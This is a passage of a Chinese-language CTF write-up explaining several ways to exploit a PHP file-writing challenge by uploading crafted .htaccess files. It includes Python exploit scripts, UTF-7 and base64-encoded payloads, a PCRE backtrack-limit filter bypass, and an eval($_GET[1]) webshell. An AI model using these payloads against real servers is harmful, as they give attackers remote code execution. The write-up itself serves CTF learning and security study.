/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191003155539.jpg" alt=""></p><p>之后我们就要思考怎么把一些恶意代码插到报错的内容当中了。</p><p>既然上面都是通过<code>include</code>不存在的文件产生报错，那我们是不是也可以利用<code>include_path</code>来构造一些错误。</p><p>例如我们可以首先通过这么来构造一个不存在的包含路径让恶意代码插入到<code>/tmp/fl3g.php</code>当中，<code>.htaccess</code>文件内容如下：</p><p></p><figure class="highlight ceylon hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> error<span class="hljs-number">_</span>log /tmp/fl<span class="hljs-number">3</span>g.php</span><br><span class="line">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> include<span class="hljs-number">_p</span>ath <span class="hljs-string">'&lt;?php phpinfo();?&gt;'</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>访问<code>index.php</code>我们可以看到：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191003160349.jpg" alt=""></p><p>这里<code>&lt;</code>被进行了 html 编码，所以我们这样去用<code>include_path '/tmp'</code>包含的<code>/tmp/fl3g.php</code>，自然也不可能执行代码。所以我们可能需要一些技巧来使得这些可以被解析。</p><p>有了上一题的基础，我们知道可以使用编码来进行解析文件，所以在这里，我们可以先用 UTF-7 编码写入，再利用<code>.htaccess</code>解码 UTF-7</p><p>所以，先尝试利用 UTF-7 编码我们需要插入的恶意代码，写入<code>.htaccess</code>的文件内容如下：</p><p></p><figure class="highlight ceylon hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> error<span class="hljs-number">_</span>log /tmp/fl<span class="hljs-number">3</span>g.php</span><br><span class="line">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> include<span class="hljs-number">_p</span>ath <span class="hljs-string">'+ADw?php phpinfo()+ADs?+AD4-'</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>然后访问<code>index.php</code>触发报错写入 log 文件<code>/tmp/fl3g.php</code>，文件内容如下：</p><p></p><figure class="highlight pgsql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-number">03</span>-Oct<span class="hljs-number">-2019</span> <span class="hljs-number">16</span>:<span class="hljs-number">23</span>:<span class="hljs-number">51</span> Asia/Shanghai] PHP <span class="hljs-built_in">Warning</span>:  include_once(fl3g.php): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: <span class="hljs-keyword">No</span> such file <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /xxx/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">10</span></span><br><span class="line">[<span class="hljs-number">03</span>-Oct<span class="hljs-number">-2019</span> <span class="hljs-number">16</span>:<span class="hljs-number">23</span>:<span class="hljs-number">51</span> Asia/Shanghai] PHP <span class="hljs-built_in">Warning</span>:  include_once(): Failed opening <span class="hljs-string">'fl3g.php'</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">'+ADw?php phpinfo()+ADs?+AD4-'</span>) <span class="hljs-keyword">in</span> /xxx/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">10</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>再把以下内容写入<code>.htaccess</code>：</p><p></p><figure class="highlight ceylon hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> error<span class="hljs-number">_</span>log /tmp/fl<span class="hljs-number">3</span>g.php</span><br><span class="line">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> include<span class="hljs-number">_p</span>ath <span class="hljs-string">'/tmp'</span></span><br><span class="line">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> zend.multibyte <span class="hljs-number">1</span></span><br><span class="line">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> zend.script<span class="hljs-number">_</span>encoding <span class="hljs-string">"UTF-7"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>访问<code>index.php</code></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191003163200.jpg" alt=""></p><p>得到 php-info </p><p>当然这里编码类型有很多，不仅仅只是 UTF-7 </p><h3 id="n"><a href="#n" class="headerlink" title="\n"></a>\n</h3><p>至于最后的<code>\nJust one chance</code>，因为它影响到了<code>.htaccess</code>文件解析，所以我们首先想到的肯定是利用<code>#</code>注释符将整句话都注视掉，但是又由于有<code>\n</code>换行符的存在，我们不能直接使用<code>#</code>就将其注释掉，需要把<code>\n</code>进行“吃”掉。</p><p>那么最常见的操作就是利用<code>\</code>斜杠将其转义了，这样<code>\\n</code>就是一个简单的<code>\n</code>字符串了。</p><p>Exp:</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PAYLOAD1 = <span class="hljs-string">"""php_value error_log /tmp/fl3g.php</span></span><br><span class="line"><span class="hljs-string">php_value error_reporting 32767</span></span><br><span class="line"><span class="hljs-string">php_value include_path "+ADw?php eval($_GET[1])+ADs?+AD4-"</span></span><br><span class="line"><span class="hljs-string"># \\"""</span></span><br><span class="line"></span><br><span class="line">PAYLOAD2 = <span class="hljs-string">"""php_value include_path "/tmp"</span></span><br><span class="line"><span class="hljs-string">php_value zend.multibyte 1</span></span><br><span class="line"><span class="hljs-string">php_value zend.script_encoding "UTF-7"</span></span><br><span class="line"><span class="hljs-string"># \\"""</span></span><br><span class="line"></span><br><span class="line">URL = <span class="hljs-string">"http://xxx/index.php"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload_content</span><span class="hljs-params">(name, content)</span>:</span></span><br><span class="line"></span><br><span class="line">    data = {</span><br><span class="line">        <span class="hljs-string">"content"</span> : content,</span><br><span class="line">        <span class="hljs-string">"filename"</span> : name,</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> requests.get(URL, params=data)</span><br><span class="line"></span><br><span class="line">rep = upload_content(<span class="hljs-string">".htaccess"</span>, PAYLOAD1)</span><br><span class="line">print(rep.text)</span><br><span class="line"></span><br><span class="line">rep = upload_content(<span class="hljs-string">".htaccess"</span>, PAYLOAD2)</span><br><span class="line">print(rep.text)</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Another-Way-Pcre"><a href="#Another-Way-Pcre" class="headerlink" title="Another Way-Pcre"></a>Another Way-Pcre</h3><p>手册中还允许设置 <a href="https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.backtrack-limit" target="_blank" rel="noopener">pcre.backtrack_limit</a> ，这个可以更改正则回溯的次数，具体可以参考 <a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><p>这里我们看到题目的代码正则部分是</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/[^a-z\.]/"</span>, $filename) == <span class="hljs-number">1</span>) {</span><br><span class="line">  <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hacker2"</span>;</span><br><span class="line">  <span class="hljs-keyword">die</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里是判断是否为 1 ，如果为 1 则 die ，而根据正则回溯，当超过回溯次数，<code>preg_match</code>会返回<code>false</code>，自然就可以绕过了。</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit <span class="hljs-number">0</span></span><br><span class="line">php_value pcre.jit <span class="hljs-number">0</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>所以我们可以先上传以上内容到<code>.htaccess</code>，利用这个回溯特性可以绕过 filename 的检测，那我们可以对 filename 做点什么操作呢？直接写入 fl3g.php ？走你</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">PAYLOAD3 = <span class="hljs-string">"""php_value pcre.backtrack_limit 0</span></span><br><span class="line"><span class="hljs-string">php_value pcre.jit 0</span></span><br><span class="line"><span class="hljs-string"># \\"""</span></span><br><span class="line"></span><br><span class="line">PAYLOAD4 = <span class="hljs-string">"""&lt;?php phpinfo();?&gt;"""</span></span><br><span class="line"></span><br><span class="line">URL = <span class="hljs-string">"http://xxx/index.php"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload_content</span><span class="hljs-params">(name, content)</span>:</span></span><br><span class="line"></span><br><span class="line">    data = {</span><br><span class="line">        <span class="hljs-string">"content"</span> : content,</span><br><span class="line">        <span class="hljs-string">"filename"</span> : name,</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> requests.get(URL, params=data)</span><br><span class="line"></span><br><span class="line">rep = upload_content(<span class="hljs-string">".htaccess"</span>, PAYLOAD3)</span><br><span class="line">print(rep.text)</span><br><span class="line"></span><br><span class="line">rep = upload_content(<span class="hljs-string">"fl3g.php"</span>, PAYLOAD4)</span><br><span class="line">print(rep.text)</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后直接访问 fl3g.php 即可。</p><p>ROIS 这里使用了一种比较复杂的方法，首先同样上传<code>.htaccess</code>把 pcre 回溯限制改成 0，然后使用 base64 写文件绕过<code>stristr</code>的判断，使用<code>auto_append_file</code>包含<code>.htaccess</code>，在<code>.htaccess</code>当中写注释 webshell 即可。</p><p>首先上传<code>.htaccess</code>，内容为：</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit <span class="hljs-number">0</span></span><br><span class="line">php_value pcre.jit <span class="hljs-number">0</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>再次上传名为<code>php://filter/write=convert.base64-decode/resource=.htaccess</code>，内容为</p><p></p><figure class="highlight gcode hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cGhwX<span class="hljs-number">3</span>ZhbHVlIHBjcmUuYmFja<span class="hljs-number">3</span>RyYW<span class="hljs-symbol">NrX2</span>xpbWl<span class="hljs-number">0</span>ICAgIDAKC<span class="hljs-symbol">nBocF92</span>YWx<span class="hljs-number">1</span>ZSBhdXRvX<span class="hljs-number">2</span>FwcGVuZF<span class="hljs-number">9</span>maWxlICAgICIuaHRhY<span class="hljs-number">2</span><span class="hljs-symbol">Nlc3</span>MiCgpwaHBfdmFsdWUgcG<span class="hljs-symbol">NyZS5</span>qaXQgICAwCgojPD<span class="hljs-number">9</span>waHAgZXZhbCgkX<span class="hljs-number">0</span>dFVFsxXSk<span class="hljs-number">7</span>Pz<span class="hljs-number">5</span>c</span><br></pre></td></tr></tbody></table></figure><p></p><p>base64 解码的内容是</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit    <span class="hljs-number">0</span></span><br><span class="line"></span><br><span class="line">php_value <span class="hljs-built_in">auto</span>_append_file    <span class="hljs-string">".htaccess"</span></span><br><span class="line"></span><br><span class="line">php_value pcre.jit   <span class="hljs-number">0</span></span><br><span class="line"></span><br><span class="line">#&lt;?php eval($_GET[<span class="hljs-number">1</span>]);?&gt;\</span><br></pre></td></tr></tbody></table></figure><p></p><p>Exp:</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">PAYLOAD5 = <span class="hljs-string">"""php_value pcre.backtrack_limit 0</span></span><br><span class="line"><span class="hljs-string">php_value pcre.jit 0</span></span><br><span class="line"><span class="hljs-string"># \\"""</span></span><br><span class="line"></span><br><span class="line">PAYLOAD6 = <span class="hljs-string">"""cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0ICAgIDAKCnBocF92YWx1ZSBhdXRvX2FwcGVuZF9maWxlICAgICIuaHRhY2Nlc3MiCgpwaHBfdmFsdWUgcGNyZS5qaXQgICAwCgojPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5c"""</span></span><br><span class="line"></span><br><span class="line">URL = <span class="hljs-string">"http://zedd.cc/xnuca/index.php"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload_content</span><span class="hljs-params">(name, content)</span>:</span></span><br><span class="line"></span><br><span class="line">    data = {</span><br><span class="line">        <span class="hljs-string">"content"</span> : content,</span><br><span class="line">        <span class="hljs-string">"filename"</span> : name,</span><br><span class="line">        <span class="hljs-string">"1"</span>: <span class="hljs-string">"echo 'Done!';"</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> requests.get(URL, params=data)</span><br><span class="line"></span><br><span class="line">rep = upload_content(<span class="hljs-string">".htaccess"</span>, PAYLOAD5)</span><br><span class="line">print(rep.text)</span><br><span class="line"></span><br><span class="line">rep = upload_content(<span class="hljs-string">"php://filter/write=convert.base64-decode/resource=.htaccess"</span>, PAYLOAD6)</span><br><span class="line">print(rep.text)</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Another-Way-backward-slash"><a href="#Another-Way-backward-slash" class="headerlink" title="Another Way-backward slash"></a>Another Way-backward slash</h3><p>既然能用<code>\</code>绕过最后的<code>\n</code>，同样我们也可以用来绕过<code>stristr</code>，而且不影响<code>.htaccess</code>的解析</p><p>Exp:</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">PAYLOAD7 = <span class="hljs-string">"""php_value auto_prepend_fi\\</span></span><br><span class="line"><span class="hljs-string">le ".htaccess"</span></span><br><span class="line"><span class="hljs-string">#&lt;?php phpinfo();?&gt;\\"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL = <span class="hljs-string">"http://xxx/index.php"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload_content</span><span class="hljs-params">(name, content)</span>:</span></span><br><span class="line"></span><br><span class="line">    data = {</span><br><span class="line">        <span class="hljs-string">"content"</span> : content,</span><br><span class="line">        <span class="hljs-string">"filename"</span> : name,</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> requests.get(URL, params=data)</span><br><span class="line"></span><br><span class="line">rep = upload_content(<span class="hljs-string">".htaccess"</span>, PAYLOAD7)</span><br><span class="line">print(rep.text)</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以一步到位</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/